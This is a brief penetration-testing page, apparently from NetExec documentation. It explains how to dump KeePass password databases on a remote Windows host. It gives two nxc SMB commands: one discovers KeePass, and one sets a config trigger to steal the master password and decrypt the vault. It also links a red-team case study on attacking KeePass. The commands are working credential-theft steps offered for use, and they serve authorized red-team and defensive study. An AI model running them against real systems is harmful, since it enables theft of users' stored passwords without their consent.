# Dump KeePass

You can check if keepass is installed on the target computer and then steal the master password and decrypt the database !

```
$ nxc smb <ip> -u user -p pass -M keepass_discover
$ nxc smb <ip> -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
```

{% embed url="https://web.archive.org/web/20211017083926/http://www.harmj0y.net:80/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2" %}
